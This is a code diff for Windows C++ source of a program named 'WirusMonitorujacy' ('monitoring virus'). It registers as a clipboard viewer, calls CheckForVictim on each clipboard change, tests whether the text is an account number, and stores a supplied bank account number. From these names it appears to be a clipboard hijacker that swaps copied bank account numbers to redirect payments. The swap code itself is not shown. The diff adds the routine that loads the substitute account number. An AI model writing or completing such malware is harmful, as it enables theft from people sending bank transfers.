@@ -1,6 +1,6 @@
 ﻿#include "main.h"
 
-constexpr char szClassName[] = "WirusMonitorujacy";
+constexpr CHAR szClassName[] = "WirusMonitorujacy";
 LPSTR bankAccount;
 HWND hwndThis;
 HWND hwndNextViewer;
@@ -82,8 +82,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 		switch (wParam)
 		{
 		case POST_NUMBER:
-			saveNumber();
-			//memcpy(bankAccount, &lParam, MAXL + 1);
+			SaveNumber(lParam);
 			bAset = true;
 			break;
 		}
@@ -94,7 +93,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 		hwndNextViewer = SetClipboardViewer(hwnd);
 		break;
 	case WM_CLIPBOARDUPDATE:
-		checkForVictim();
+		CheckForVictim();
 		if (hwndNextViewer != NULL)
 			SendMessage(hwndNextViewer, msg, wParam, lParam);
 		break;
@@ -119,7 +118,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
-void checkForVictim()
+void CheckForVictim()
 {
 	if (!bAset)
 		return;
@@ -174,7 +173,10 @@ bool CheckIfAccountNumber(LPSTR str)
 	return true;
 }
 
-void saveNumber()
+void SaveNumber(LONG_PTR num)
 {
-
+	//bankAccount = (LPSTR)calloc(MAXL + 1, sizeof(CHAR));
+	LPSTR lpGlobalMem = LPSTR(GlobalLock(HGLOBAL(num)));
+	memcpy(bankAccount, lpGlobalMem, MAXL + 1);
+	GlobalFree(HGLOBAL(num));
 }
